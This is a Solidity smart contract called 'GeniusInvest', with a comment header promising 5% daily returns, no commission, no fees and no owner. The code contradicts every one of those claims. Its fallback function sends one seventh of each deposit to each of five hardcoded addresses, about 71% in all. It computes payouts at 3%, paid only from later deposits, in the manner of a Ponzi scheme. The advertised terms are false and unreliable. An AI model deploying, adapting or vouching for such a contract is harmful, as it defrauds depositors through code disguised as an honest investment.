['pragma solidity ^0.4.24;\n', '/**\n', ' *\n', ' * \n', ' * \n', ' * \n', ' * \n', '\n', '- ▒█▀▀█ █▀▀ █▀▀▄ ░▀░ █░░█ █▀▀ \u3000 ▀█▀ █▀▀▄ ▀█░█▀ █▀▀ █▀▀ ▀▀█▀▀ \n', '- ▒█░▄▄ █▀▀ █░░█ ▀█▀ █░░█ ▀▀█ \u3000 ▒█░ █░░█ ░█▄█░ █▀▀ ▀▀█ ░░█░░ \n', '- ▒█▄▄█ ▀▀▀ ▀░░▀ ▀▀▀ ░▀▀▀ ▀▀▀ \u3000 ▄█▄ ▀░░▀ ░░▀░░ ▀▀▀ ▀▀▀ ░░▀░░ \n', '\n', '- █▀▀█ █▀▀ █▀▀█ \u3000 █▀▀▄ █▀▀█ █░░█ \u3000 █▀▀ \u3000 \u3000  ▒█▀▀█ █▀▀█ █▀▀█ █▀▀ ░▀░ ▀▀█▀▀ \n', '- █░░█ █▀▀ █▄▄▀ \u3000 █░░█ █▄▄█ █▄▄█ \u3000 ▀▀▄ %\u3000 \u3000 ▒█▄▄█ █▄▄▀ █░░█ █▀▀ ▀█▀ ░░█░░ \n', '- █▀▀▀ ▀▀▀ ▀░▀▀ \u3000 ▀▀▀░ ▀░░▀ ▄▄▄█ \u3000 ▄▄▀ \u3000 \u3000  ▒█░░░ ▀░▀▀ ▀▀▀▀ ▀░░ ▀▀▀ ░░▀░░ \n', '\n', ' * \n', ' * \n', ' * \n', ' * \n', ' * \n', ' * \n', ' * \n', ' * \n', ' * \n', ' * \n', ' * \n', ' * \n', ' * Genius Investment Contract\n', ' *  - GAIN 5% PER 24 HOURS(every 5900 blocks)\n', ' *  - NO COMMISSION on your investment (every ether stays on contract&#39;s balance)\n', ' *  - NO FEES are collected by the owner, in fact, there is no owner at all (just look at the code)\n', ' *\n', ' * How to use:\n', ' *  1. Send any amount of ether to make an investment\n', ' *  2a. Claim your profit by sending 0 ether transaction (every day, every week, i don&#39;t care unless you&#39;re spending too much on GAS)\n', ' *  OR\n', ' *  2b. Send more ether to reinvest AND get your profit at the same time\n', ' *\n', ' * RECOMMENDED GAS LIMIT: 100000\n', ' * RECOMMENDED GAS PRICE: https://ethgasstation.info/\n', ' *\n', ' * Contract reviewed and approved by pros!\n', ' *\n', ' */\n', 'contract GeniusInvest {\n', '    address adcost;\n', '    address projectcom;\n', '    address transcom;\n', '    address pay1;\n', '    address pay2;\n', '    \n', '    function GeniusInvest() {\n', '        adcost = 0x47e82527E90031D281c7dCE0e36Ae676914c3921;\n', '        projectcom = 0x8B775a54d6078D53E4A023366AcD1BcC437f0b62;\n', '        transcom = 0x6cF906597fd441F7EF80ffE57C5fe60a73d0504B;\n', '        pay1 = 0x54Cf7A3288142F476A7577243A1a845a86f7c69e;\n', '        pay2 = 0x8b3b9d2a57B0806C2A33f191e3b08eb04bC1A182;\n', '    }\n', '    \n', '    mapping (address => uint256) balances;\n', '    mapping (address => uint256) timestamp;\n', '\n', '    function() external payable {\n', '        uint256 getmsgvalue = msg.value / 7;\n', '        adcost.transfer(getmsgvalue);\n', '        projectcom.transfer(getmsgvalue);\n', '        transcom.transfer(getmsgvalue);\n', '        pay1.transfer(getmsgvalue);\n', '        pay2.transfer(getmsgvalue);\n', '        if (balances[msg.sender] != 0){\n', '        address sender = msg.sender;\n', '        uint256 getvalue = balances[msg.sender]*3/100*(block.number-timestamp[msg.sender])/5900;\n', '        sender.transfer(getvalue);\n', '        }\n', '\n', '        timestamp[msg.sender] = block.number;\n', '        balances[msg.sender] += msg.value;\n', '\n', '    }\n', '}']